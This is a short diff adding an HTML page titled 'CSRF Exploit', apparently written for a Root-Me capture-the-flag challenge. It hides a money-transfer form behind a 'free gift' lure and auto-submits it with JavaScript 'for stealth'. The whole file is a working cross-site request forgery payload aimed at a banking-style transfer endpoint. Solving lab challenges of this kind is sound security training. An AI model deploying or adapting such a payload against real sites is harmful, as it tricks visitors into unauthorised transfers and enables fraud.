@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>Special Offer! Click Below</h1>
+    <p>Claim your free gift now!</p>
+    <form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+        <input type="hidden" name="recipient" value="aaa">
+        <input type="hidden" name="amount" value="158515">
+        <button type="submit">Claim Your Gift!</button>
+    </form>
+    <!-- Optionally, auto-submit the form for stealth -->
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
